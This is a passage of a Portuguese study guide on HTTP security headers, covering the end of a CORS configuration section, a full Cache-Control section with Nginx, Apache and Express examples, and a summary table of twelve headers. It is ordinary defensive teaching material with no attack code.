    SetEnvIf Origin "^https://app\.loja-ficticia\.test$" CORS_TRUSTED_ORIGIN=$0

    Header always set Access-Control-Allow-Origin %{CORS_TRUSTED_ORIGIN}e env=CORS_TRUSTED_ORIGIN
    Header always set Access-Control-Allow-Credentials "true" env=CORS_TRUSTED_ORIGIN
    Header always merge Vary "Origin"
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const cors = require('cors');

const app = express();

const origensConfiaveis = new Set(['https://app.loja-ficticia.test']);

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || origensConfiaveis.has(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Origem não autorizada pelo CORS'));
      }
    },
    credentials: true // Envia Access-Control-Allow-Credentials: true apenas para as origens válidas
  })
);
```

---

<a id="s5-12"></a>
### 5.12 Cache-Control

##### 1. O que faz
O cabeçalho **`Cache-Control`** — padronizado na **RFC 9111 (HTTP Caching)** — especifica diretivas de armazenamento em cache que devem ser obedecidas por todos os mecanismos de cache ao longo do caminho entre o servidor e o usuário: tanto **caches compartilhados** (CDNs, proxies reversos corporativos, balanceadores de carga) quanto **caches privados** (Disk Cache e Memory Cache internos do navegador do usuário, detalhados em [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)).

Embora muitos estudantes associem o `Cache-Control` apenas à **performance**, ele é um **header de segurança crítico** quando lidamos com respostas autenticadas, dados financeiros, tokens e **PII** (*Personally Identifiable Information*):
1. **Risco em Computadores Compartilhados / Quiosques**: Se um usuário acessa seu extrato bancário ou prontuário médico em um computador de laboratório, biblioteca ou hospital e o servidor não proíbe o armazenamento em disco (`no-store`), mesmo após o usuário clicar em *"Sair"*, a próxima pessoa a sentar no computador pode clicar no botão *Voltar* do navegador ou inspecionar o cache de disco na aba Network (`(disk cache)`) e visualizar os dados confidenciais!
2. **Risco em Caches Compartilhados (CDNs e Ataques de *Web Cache Deception*)**: Se uma rota que retorna dados do usuário logado (`/minha-conta` ou `/api/perfil`) for armazenada acidentalmente por uma CDN pública (por estar com `Cache-Control: public` ou por regras mal configuradas da CDN que fazem cache baseado em extensão `.css`/`.js` em ataques de *Web Cache Deception*, ex.: `/api/perfil/estilo.css`), a CDN entregará os dados pessoais e até mesmo o header `Set-Cookie` do Usuário A para os Usuários B, C e D!

As diretivas essenciais do `Cache-Control` e o contraste entre **respostas sensíveis** e **ativos estáticos públicos** são:

- **`no-store`** (Diretiva mais importante de segurança!): Proíbe terminantemente que qualquer cache (seja o navegador local ou uma CDN/proxy intermediário) grave qualquer parte da requisição ou da resposta em armazenamento persistente ou volátil reutilizável. A resposta é usada para renderizar a tela atual e descartada.
- **`no-cache`** (Atenção à pegadinha clássica de prova!): Apesar do nome parecer que "não faz cache", a diretiva `no-cache` **permite que a resposta seja armazenada no cache**, mas **obriga** o navegador ou proxy a **revalidar** a resposta junto ao servidor de origem (usando `If-None-Match` / `ETag` ou `If-Modified-Since`, recebendo `304 Not Modified`) antes de reutilizá-la. Portanto, `no-cache` sozinho **não impede** que dados fiquem gravados no disco!
- **`private`**: Indica que a resposta destina-se a um único usuário final e **só pode ser armazenada pelo cache privado do navegador**, sendo **proibido** seu armazenamento em caches compartilhados (CDNs e proxies).
- **`public`**: Indica que a resposta pode ser armazenada por qualquer cache, inclusive CDNs e proxies compartilhados, mesmo que a requisição original contivesse um header `Authorization`.
- **`max-age=<segundos>`**: Define o tempo máximo (em segundos, relativo ao momento da geração da resposta) durante o qual o recurso é considerado "fresco" (*fresh*).`max-age=0` considera o recurso imediatamente expirado (*stale*).
- **`s-maxage=<segundos>`**: Sobrescreve o `max-age` especificamente para **caches compartilhados** (CDNs/proxies).
- **`must-revalidate`**: Instrui o cache de que, uma vez que a resposta tenha expirado (`max-age` atingido), ele **não pode** servir a versão expirada sem antes revalidar com sucesso no servidor de origem.
- **`immutable`**: Informa ao navegador que o corpo daquele recurso **nunca mudará** enquanto ele estiver fresco (`max-age`), evitando revalidações desnecessárias mesmo quando o usuário recarrega a página. Ideal para arquivos estáticos com hash no nome (`bundle.a1b2c3d4.js`).

| Tipo de Recurso | Configuração de `Cache-Control` Recomendada | Objetivo de Segurança e Performance |
| :--- | :--- | :--- |
| **Dados Autenticados, PII, Tokens, Páginas Financeiras / Médicas** | `Cache-Control: no-store, no-cache, max-age=0, must-revalidate, private` (ou simplesmente `Cache-Control: no-store`) | **[REQUISITO]** Garante que nenhum dado confidencial seja gravado no disco do navegador ou retido em CDNs/proxies compartilhados. |
| **Páginas HTML Dinâmicas ou Públicas sujeitas a atualização imediata** | `Cache-Control: private, no-cache, no-store, must-revalidate` (se contiver estado do usuário) ou `Cache-Control: public, no-cache` (se for HTML 100% público) | Evita servir estado de sessão trocado e garante que atualizações críticas de CSP/segurança no HTML entrem em vigor imediatamente. |
| **Ativos Estáticos Públicos Versionados** (`app.8f9d2a.js`, `main.4c1b.css`, fontes, imagens públicas) | `Cache-Control: public, max-age=31536000, immutable` | **[BOA PRÁTICA]** Máximo desempenho em CDNs e no navegador por 1 ano (31.536.000 s), pois não contêm nenhum dado privado e mudam de URL a cada deploy (*cache busting*). |

##### 2. Quando se aplica (contexto de uso)
- **[REQUISITO]** (`Cache-Control: no-store`) em todas as rotas de API autenticadas, endpoints de login/autenticação, respostas contendo tokens JWT/OAuth, dados pessoais (LGPD/GDPR), extratos financeiros e painéis administrativos.
- **[BOA PRÁTICA]** (`public, max-age=31536000, immutable`) em arquivos estáticos públicos com hash de versão no nome do arquivo.

##### 3. Exemplo prático
Resposta de uma API bancária retornando os dados do cartão virtual do cliente logado em `https://api.banco.exemplo.test/v1/cartao-virtual`:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-store, no-cache, max-age=0, must-revalidate, private
Pragma: no-cache
Expires: 0
```
*(Nota: `Pragma: no-cache` e `Expires: 0` são cabeçalhos legados do HTTP/1.0 frequentemente enviados junto com `Cache-Control: no-store` por mera retrocompatibilidade com proxies muito antigos).*

Já para o pacote JavaScript público da aplicação com hash no nome (`https://banco.exemplo.test/assets/main.9e8f7a6b.js`):

```http
HTTP/2 200 OK
Content-Type: text/javascript; charset=utf-8
Cache-Control: public, max-age=31536000, immutable
X-Content-Type-Options: nosniff
```

##### 4. Configuração recomendada
Para qualquer endpoint ou página que retorne dados específicos do usuário ou informações sensíveis:
```http
Cache-Control: no-store
```
*(Ou a forma defensiva estendida: `Cache-Control: no-store, no-cache, max-age=0, must-revalidate, private`).*

##### 5. O que acontece quando está ausente
- Quando o servidor omite o cabeçalho `Cache-Control`, a **RFC 9111** permite que navegadores e proxies apliquem **Cache Heurístico** (*heuristic caching*): se a resposta tiver status `200 OK` e não possuir restrições explícitas, o navegador ou a CDN pode decidir armazená-la em cache por conta própria (por exemplo, calculando 10% do tempo desde o header `Last-Modified`).
- Respostas de APIs ou páginas autenticadas podem acabar salvas no **Disk Cache** do computador, visíveis para outros usuários da mesma máquina na aba Network do DevTools mesmo sem conexão com a internet.

##### 6. O que pode acontecer quando está configurado incorretamente
- **Usar `Cache-Control: public, max-age=...` em rotas autenticadas**: Uma CDN (como Cloudflare, Akamai, CloudFront ou Varnish) armazenará a resposta do primeiro usuário que acessar a rota e entregará os dados pessoais dele (ou até o cabeçalho `Set-Cookie` da sessão dele!) para todos os demais visitantes do site.
- **Usar apenas `Cache-Control: no-cache` achando que ele impede a gravação no disco**: Como vimos, `no-cache` ainda grava a resposta no cache local do navegador, apenas exigindo revalidação (`304 Not Modified`). Em uma análise forense ou inspeção direta do cache local, os dados continuam presentes no disco. Para proibir a gravação física, a diretiva correta e obrigatória é **`no-store`**.

##### 7. Como verificar na aba Network do DevTools
1. Abra a aba **[Network](./02a-devtools-network.md#s2-1)** do Chrome DevTools e **desmarque** a caixa **Disable cache** (para permitir que o navegador comporte-se como o de um usuário real).
2. Navegue pelas telas autenticadas da aplicação e observe a coluna **Size** da tabela de requisições:
   - Se uma chamada de API que retorna dados pessoais (`/api/perfil`, `/api/pedidos`) aparecer com **`(disk cache)`** ou **`(memory cache)`** na coluna **Size** ao navegar de volta ou recarregar, há uma falha de política de cache!
3. Clique na requisição e inspecione **Response Headers** para confirmar a presença de `cache-control: no-store`.

##### 8. Como corrigir (exemplos em Nginx, Apache e Express/Node.js)

**Nginx**:
```nginx
server {
    listen 443 ssl http2;
    server_name loja-ficticia.test;

    # 1. Rotas de API e área logada: proíbe terminantemente qualquer cache
    location /api/ {
        add_header Cache-Control "no-store, no-cache, max-age=0, must-revalidate, private" always;
        add_header Pragma "no-cache" always;
        proxy_pass http://backend_upstream;
    }

    # 2. Ativos estáticos públicos com hash no nome: cache imutável de 1 ano
    location /static/ {
        add_header Cache-Control "public, max-age=31536000, immutable" always;
        add_header X-Content-Type-Options "nosniff" always;
    }
}
```

**Apache HTTP Server**:
```apache
<VirtualHost *:443>
    ServerName loja-ficticia.test

    <Location "/api/">
        Header always set Cache-Control "no-store, no-cache, max-age=0, must-revalidate, private"
        Header always set Pragma "no-cache"
    </Location>

    <Location "/static/">
        Header always set Cache-Control "public, max-age=31536000, immutable"
    </Location>
</VirtualHost>
```

**Express / Node.js**:
```javascript
const express = require('express');
const path = require('path');

const app = express();

// 1. Servir arquivos estáticos públicos versionados com cache longo e imutável
app.use(
  '/static',
  express.static(path.join(__dirname, 'public'), {
    maxAge: '1y',
    immutable: true
  })
);

// 2. Middleware para todas as rotas de API autenticadas proibindo o cache
app.use('/api', (req, res, next) => {
  res.setHeader(
    'Cache-Control',
    'no-store, no-cache, max-age=0, must-revalidate, private'
  );
  res.setHeader('Pragma', 'no-cache');
  next();
});
```

---

<a id="s5-13"></a>
### 5.13 Tabela-Resumo dos Headers de Segurança HTTP

A tabela abaixo consolida os 12 cabeçalhos de segurança estudados nesta seção, servindo como guia rápido de revisão para a prova e referência para auditorias práticas (veja também o [Checklist de Auditoria no Navegador](./06-checklist-e-comparativo.md#s6)):

| Header HTTP | Finalidade Principal | Ameaça / Vulnerabilidade Mitigada | Valor Seguro Recomendado (Referência) | Quando se Aplica (Contexto) |
| :--- | :--- | :--- | :--- | :--- |
| **`Content-Security-Policy` (CSP)** | Controlar origens e execução de scripts, estilos, imagens, conexões, frames e sumidouros DOM. | **XSS** (Refletido, Armazenado, DOM), Exfiltração de dados, *Clickjacking* (`frame-ancestors`), *Mixed Content*, *Base Tag Hijacking*. | `default-src 'self'; script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` | **[REQUISITO]** em documentos HTML/SVG; **[BOA PRÁTICA]** (`default-src 'none'; frame-ancestors 'none'`) em APIs. |
| **`Strict-Transport-Security` (HSTS)** | Forçar o navegador a conectar-se exclusivamente via HTTPS durante todo o período `max-age`. | **SSL Stripping** (*Man-in-the-Middle* na primeira requisição HTTP), downgrade de protocolo e clique em certificados inválidos. | `max-age=63072000; includeSubDomains; preload` *(após validar todos os subdomínios)* | **[REQUISITO]** em todas as respostas HTTPS de domínios em produção. |
| **`X-Content-Type-Options`** | Proibir o navegador de tentar adivinhar (*MIME sniffing*) o tipo do arquivo ignorando o `Content-Type`. | **Stored XSS** via upload de arquivos (`.txt`/`.jpg` com HTML dentro) e inclusão cross-origin de scripts (*XSSI*). | `nosniff` | **[REQUISITO]** universal em **100%** das respostas HTTP (HTML, JSON, JS, CSS, imagens, uploads). |
| **`X-Frame-Options`** | Impedir que a página seja embutida em `<frame>` ou `<iframe>` por sites externos. | **Clickjacking** (*UI Redressing*). *(Nota: nos navegadores modernos, `CSP: frame-ancestors` tem precedência).* | `DENY` *(ou `SAMEORIGIN` se usar iframes internos da mesma origem)* | **[REQUISITO]** em páginas HTML interativas; **[BOA PRÁTICA]** em APIs. |
| **`Referrer-Policy`** | Controlar quanto da URL de origem é enviado no header de requisição `Referer` ao navegar ou carregar recursos. | Vazamento de tokens de redefinição de senha, códigos OAuth, IDs e caminhos sensíveis na URL para servidores de terceiros. | `strict-origin-when-cross-origin` *(geral)* ou `no-referrer` / `same-origin` *(sistemas críticos)* | **[RECOMENDAÇÃO]** em todos os documentos HTML e folhas de estilo CSS. |
| **`Permissions-Policy`** | Desativar ou restringir APIs de hardware e recursos sensíveis do navegador no documento e em iframes. | Abuso silencioso de câmera, microfone, geolocalização, USB ou pagamentos via XSS ou iframes de terceiros. | `geolocation=(), camera=(), microphone=(), payment=(), usb=()` | **[RECOMENDAÇÃO]** em todos os documentos HTML (Princípio do Menor Privilégio). |
| **`Cross-Origin-Opener-Policy` (COOP)** | Isolar a janela/aba (*top-level*) em um novo *Browsing Context Group*, zerando `window.opener` entre origens. | Ataques **Cross-Window / XS-Leaks**, compartilhamento de processo (*Spectre*) e *Reverse Tabnabbing*. | `same-origin` *(ou `same-origin-allow-popups` se usar pop-ups OAuth)* | **[RECOMENDAÇÃO]** em páginas HTML; **[REQUISITO]** para `self.crossOriginIsolated`. |
| **`Cross-Origin-Resource-Policy` (CORP)** | Declarar quais origens podem incorporar/carregar (`<img>`, `<script>`, `no-cors`) um sub-recurso específico. | Leitura cross-origin por canal lateral (**Spectre**), *XS-Leaks* de imagens/estados privados e *hotlinking*. | `same-origin` *(privado)*, `same-site` *(subdomínios)* ou `cross-origin` *(CDN pública)* | **[RECOMENDAÇÃO]** em todos os sub-recursos e endpoints privados; **[REQUISITO]** sob COEP. |
| **`Cross-Origin-Embedder-Policy` (COEP)** | Impedir que a página carregue sub-recursos cross-origin que não enviem autorização CORP ou CORS explícita. | Vazamento de memória por execução especulativa (**Spectre**) ao utilizar memória compartilhada. | `require-corp` ou `credentialless` *(em conjunto com `COOP: same-origin`)* | **[REQUISITO]** quando a aplicação precisa de `SharedArrayBuffer` (`self.crossOriginIsolated === true`). |
| **`Access-Control-Allow-Origin`** | Autorizar explicitamente uma origem externa (ou `*` público) a ler respostas via CORS (`fetch`/`XHR`). | Quando bem configurado, preserva a **SOP**; quando mal configurado (refletindo `Origin`), causa vazamento de dados cross-origin. | `https://app.exemplo.test` + `Vary: Origin` *(autenticado)* ou `*` *(apenas dados 100% públicos)* | **Apenas** em APIs e ativos que realmente precisem ser lidos por outra origem via CORS. |
| **`Access-Control-Allow-Credentials`** | Permitir que o JavaScript de uma origem cruzada autorizada leia respostas de requisições com cookies/`Authorization`. | Exfiltração de dados de sessões autenticadas caso seja combinado indevidamente com reflexão de `Origin`. | `true` *(somente junto com `ACAO` de origem exata validada em allowlist + `Vary: Origin`)* | **Apenas** em endpoints CORS que exigem envio de cookies/credenciais entre origens confiáveis. |
| **`Cache-Control`** | Governar se e por quanto tempo navegadores, proxies e CDNs podem armazenar a resposta HTTP. | Vazamento de dados pessoais/sessão em computadores públicos e **Web Cache Deception / Poisoning** em CDNs. | `no-store` *(para dados sensíveis/autenticados)*; `public, max-age=31536000, immutable` *(estáticos com hash)* | **[REQUISITO]** (`no-store`) em páginas e APIs autenticadas ou com dados pessoais. |

---

---

> [⬅️ 4. Redes de Computadores e Portas](./04-redes-de-computadores.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [6 e 7. Checklist de Auditoria e Comparativo ➡️](./06-checklist-e-comparativo.md)
